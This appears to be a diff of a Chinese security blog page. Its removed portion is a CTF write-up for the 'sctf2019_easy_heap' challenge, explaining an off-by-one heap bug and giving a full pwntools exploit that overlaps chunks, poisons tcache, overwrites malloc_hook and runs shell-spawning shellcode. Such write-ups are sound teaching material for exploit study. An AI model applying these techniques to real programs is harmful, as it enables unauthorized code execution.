-        <h5 id="例行检查，保护全开"><a href="#例行检查，保护全开" class="headerlink" title="例行检查，保护全开"></a>例行检查，保护全开</h5><h5 id="调用了mmap函数，把0xFFFFFFF000的地址映射到内存中某个地址，并打印出来，很明显这道题得用shellcode来做，这个地址可读可写可运行，后面要用"><a href="#调用了mmap函数，把0xFFFFFFF000的地址映射到内存中某个地址，并打印出来，很明显这道题得用shellcode来做，这个地址可读可写可运行，后面要用" class="headerlink" title="调用了mmap函数，把0xFFFFFFF000的地址映射到内存中某个地址，并打印出来，很明显这道题得用shellcode来做，这个地址可读可写可运行，后面要用"></a>调用了mmap函数，把0xFFFFFFF000的地址映射到内存中某个地址，并打印出来，很明显这道题得用shellcode来做，这个地址可读可写可运行，后面要用</h5><p><img src="https://i.imgs.ovh/2023/12/04/3nFPj.png" alt="image-20231204213036915"></p>
-<h5 id="add函数-会打印出堆的地址"><a href="#add函数-会打印出堆的地址" class="headerlink" title="add函数,会打印出堆的地址"></a>add函数,会打印出堆的地址</h5><p><img src="https://i.imgs.ovh/2023/12/04/3np8e.png" alt="image-20231204213219796"></p>
-<h5 id="full函数，能输入内容到堆上"><a href="#full函数，能输入内容到堆上" class="headerlink" title="full函数，能输入内容到堆上"></a>full函数，能输入内容到堆上</h5><p><img src="https://i.imgs.ovh/2023/12/04/3n3A3.png" alt="image-20231204213548121"></p>
-<h5 id="最后会增添一个’-x00’-存在off-by-one-漏洞"><a href="#最后会增添一个’-x00’-存在off-by-one-漏洞" class="headerlink" title="最后会增添一个’\x00’,存在off by one 漏洞"></a>最后会增添一个’\x00’,存在off by one 漏洞</h5><p><img src="https://i.imgs.ovh/2023/12/04/3nfs9.png" alt="image-20231204213619003"></p>
-<h5 id="free函数，没什么漏洞"><a href="#free函数，没什么漏洞" class="headerlink" title="free函数，没什么漏洞"></a>free函数，没什么漏洞</h5><p><img src="https://i.imgs.ovh/2023/12/04/3nWVH.png" alt="image-20231204213731793"></p>
-<h5 id="先接收mmap映射的地址"><a href="#先接收mmap映射的地址" class="headerlink" title="先接收mmap映射的地址"></a>先接收mmap映射的地址</h5><pre><code class="lang-py">p.recvuntil(b&#39;Mmap: &#39;)
-vmap = p.recvline().strip()
-vmap = int(vmap, 16)
-print(&#39;vmap=&gt;&#39;+hex(vmap))
-</code></pre>
-<h5 id="做off-by-one这种题的话，有个技巧，一般都是先申请四个堆"><a href="#做off-by-one这种题的话，有个技巧，一般都是先申请四个堆" class="headerlink" title="做off-by-one这种题的话，有个技巧，一般都是先申请四个堆"></a>做off-by-one这种题的话，有个技巧，一般都是先申请四个堆</h5><pre><code class="lang-py">add(0x410) #0
-add(0x68) #1
-add(0x4f0) #2
-add(0x68) #3
-</code></pre>
-<h5 id="然后释放第一个，然后填充第一个堆，利用sub-E2D函数的输入把堆2的size位改为0，然后释放堆2进行unlink操作，然后堆1会被夹在中间"><a href="#然后释放第一个，然后填充第一个堆，利用sub-E2D函数的输入把堆2的size位改为0，然后释放堆2进行unlink操作，然后堆1会被夹在中间" class="headerlink" title="然后释放第一个，然后填充第一个堆，利用sub_E2D函数的输入把堆2的size位改为0，然后释放堆2进行unlink操作，然后堆1会被夹在中间"></a>然后释放第一个，然后填充第一个堆，利用sub_E2D函数的输入把堆2的size位改为0，然后释放堆2进行unlink操作，然后堆1会被夹在中间</h5><pre><code class="lang-py">free(0)
-payload=p64(0)*12+p64(0x490)
-fill(1,payload)
-</code></pre>
-<p><img src="https://i.imgs.ovh/2023/12/04/3HLO5.png" alt="image-20231204220708856"></p>
-<h5 id="释放堆2，会进行unlink"><a href="#释放堆2，会进行unlink" class="headerlink" title="释放堆2，会进行unlink"></a>释放堆2，会进行unlink</h5><p><img src="https://i.imgs.ovh/2023/12/04/3H2lX.png" alt="image-20231204220956361"></p>
-<h5 id="再申请一次0x410和0x68大小的堆，堆2会和堆1的位置重合"><a href="#再申请一次0x410和0x68大小的堆，堆2会和堆1的位置重合" class="headerlink" title="再申请一次0x410和0x68大小的堆，堆2会和堆1的位置重合"></a>再申请一次0x410和0x68大小的堆，堆2会和堆1的位置重合</h5><p><img src="https://i.imgs.ovh/2023/12/04/3H6lu.png" alt="image-20231204223334972"></p>
-<h5 id="再delete几次，相当于double-free了堆2"><a href="#再delete几次，相当于double-free了堆2" class="headerlink" title="再delete几次，相当于double free了堆2"></a>再delete几次，相当于double free了堆2</h5><pre><code class="lang-py">delete(3)
-delete(1) #1=&gt;#3 
-delete(2) #2(1)=&gt;1
-</code></pre>
-<p><img src="https://i.imgs.ovh/2023/12/04/3H3Qp.png" alt="image-20231204223004490"></p>
-<h5 id="接下来改bin链指针成改成vmap的，写上shellcode"><a href="#接下来改bin链指针成改成vmap的，写上shellcode" class="headerlink" title="接下来改bin链指针成改成vmap的，写上shellcode"></a>接下来改bin链指针成改成vmap的，写上shellcode</h5><p><img src="https://i.imgs.ovh/2023/12/06/3gchT.png" alt="image-20231206200052135"></p>
-<h5 id="上面的话堆2是没有free的，然后用上面的方式再unlink一次，再add0x410大小的堆，会在堆2的fd指针上有main-arena-96的地址。"><a href="#上面的话堆2是没有free的，然后用上面的方式再unlink一次，再add0x410大小的堆，会在堆2的fd指针上有main-arena-96的地址。" class="headerlink" title="上面的话堆2是没有free的，然后用上面的方式再unlink一次，再add0x410大小的堆，会在堆2的fd指针上有main_arena+96的地址。"></a>上面的话堆2是没有free的，然后用上面的方式再unlink一次，再add0x410大小的堆，会在堆2的fd指针上有main_arena+96的地址。</h5><pre><code class="lang-py">fill(1,payload) 
-
-delete(1)
-
-delete(4) #unlink
-
-add(0x410) # 0
-</code></pre>
-<p><img src="https://i.imgs.ovh/2023/12/09/feBe9.png" alt="image-20231209222142417"></p>
-<h5 id="fill堆2一个字节，将其改为0x30，既是mallloc-hook的地址"><a href="#fill堆2一个字节，将其改为0x30，既是mallloc-hook的地址" class="headerlink" title="fill堆2一个字节，将其改为0x30，既是mallloc_hook的地址"></a>fill堆2一个字节，将其改为0x30，既是mallloc_hook的地址</h5><p><img src="https://i.imgs.ovh/2023/12/09/feIGO.png" alt="image-20231209222512116"></p>
-<h5 id="再malloc0x68两次，第二次写上vmap的地址-再任意申请一次堆即可提权"><a href="#再malloc0x68两次，第二次写上vmap的地址-再任意申请一次堆即可提权" class="headerlink" title="再malloc0x68两次，第二次写上vmap的地址,再任意申请一次堆即可提权"></a>再malloc0x68两次，第二次写上vmap的地址,再任意申请一次堆即可提权</h5><pre><code class="lang-py">add(0x68) #1
-fill(1,p64(vmap)) # 4
-
-add(0x68) #4
-fill(4,p64(vmap))
-add(0x20)
-</code></pre>
-<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code class="lang-py">from pwn import*
-from LibcSearcher import *
-#p=remote(&quot;node4.buuoj.cn&quot;,28038)
-p=process(&quot;./sctf2019_easy_heap&quot;)
-context.log_level=&quot;debug&quot;
-libc=ELF(&#39;./libc-2.27.so&#39;)
-context.arch=&#39;amd64&#39;
-#context=arch(&#39;amd64&#39;)
-def add(size):
-    p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;1&#39;)
-    p.sendlineafter(&#39;Size: &#39;,str(size))
-
-def fill(index,content):
-    p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;3&#39;)
-    p.sendlineafter(&#39;Index:&#39;,str(index))
-    p.sendlineafter(&#39;Content:&#39;,content)
-
-def delete(index):
-    p.sendlineafter(&#39;&gt;&gt; &#39;,&#39;2&#39;)
-    p.sendlineafter(&#39;Index: &#39;,str(index))
-
-p.recvuntil(b&#39;Mmap: &#39;)
-vmap = p.recvline().strip()
-vmap = int(vmap, 16)
-print(&#39;vmap=&gt;&#39;+hex(vmap))
-add(0x410) #0
-add(0x68) #1
-add(0x4f0) #2
-add(0x68) #3
-
-payload=p64(0)*12+p64(0x490)
-delete(0)
-
-fill(1,payload)
-
-delete(2)
-
-add(0x410) #0
-add(0x68)  #2 lead to chunk1
-
-delete(3)
-delete(1) #1=&gt;3
-delete(2) #1=&gt;1 in the similar case we use by UAF,but it is not.
-
-add(0x68) #1
-
-fill(1,p64(vmap))
-add(0x68) #2
-add(0x68) #3
-
-shellcode=asm(shellcraft.sh())
-fill(3,shellcode)
-
-add(0x4f0) #4
-
-delete(0) #free 0x410
-
-fill(1,payload) 
-
-delete(1)
-
-delete(4) #unlink
-
-add(0x410) # 0
-gdb.attach(p)
-sleep(1)
-pause()
-fill(2,&#39;\x30&#39;)
-
-add(0x68) #1
-fill(1,p64(vmap)) # 4
-
-add(0x68) #4
-fill(4,p64(vmap))
-add(0x20)
-
-p.interactive()
-</code></pre>
-
-        
-
-
-        <span>
-          <a class="article-read" href="/2023/12/06/sctf2019-easy-heap/"> Read more -->
+          <a class="article-read" href="/2024/03/02/ACTF-2019-OneRepeater/"> Read more -->
           </span>
         </div>
 
@@ -801,7 +745,7 @@ p.interactive()
 
 
       <div id="recent-posts-paginator">
-        <a class="extend prev" rel="prev" href="/page/7/"> </a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/9/"> </a>
+        <a class="extend prev" rel="prev" href="/page/7/"> </a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><a class="page-number" href="/page/10/">10</a><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/9/"> </a>
       </div>
 
     </div>
@@ -857,23 +801,23 @@ p.interactive()
       <ul>
         
           <li>
-            <a class="recent_posts-list-link" href="/2024/11/03/house-of-force/">200~house_of_force</a>
+            <a class="recent_posts-list-link" href="/2024/11/26/FUZZ/xpdf/">xpdf</a>
           </li>
         
           <li>
-            <a class="recent_posts-list-link" href="/2024/10/29/pwn2%20short/">(no title)</a>
+            <a class="recent_posts-list-link" href="/2024/11/20/trick/">trick</a>
           </li>
         
           <li>
-            <a class="recent_posts-list-link" href="/2024/10/21/overlapping_chunks/">overlapping_chunks</a>
+            <a class="recent_posts-list-link" href="/2024/11/20/trick/trick/">trick</a>
           </li>
         
           <li>
-            <a class="recent_posts-list-link" href="/2024/10/17/heapcreator/">heapcreator</a>
+            <a class="recent_posts-list-link" href="/2024/11/18/qwnt2024/">qwnt2024</a>
           </li>
         
           <li>
-            <a class="recent_posts-list-link" href="/2024/09/21/stdout/">stdout</a>
+            <a class="recent_posts-list-link" href="/2024/11/13/%E6%B2%99%E7%AE%B1/%E6%B2%99%E7%AE%B1/">沙箱</a>
           </li>
         
       </ul>
@@ -885,7 +829,7 @@ p.interactive()
 </aside>
 
 <!-- <div id="paginator"> -->
-<!--   <a class="extend prev" rel="prev" href="/page/7/"> </a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/9/"> </a> -->
+<!--   <a class="extend prev" rel="prev" href="/page/7/"> </a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="page-number current">8</span><a class="page-number" href="/page/9/">9</a><a class="page-number" href="/page/10/">10</a><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/9/"> </a> -->
 <!-- </div> -->
 
     <script type="text/x-mathjax-config">
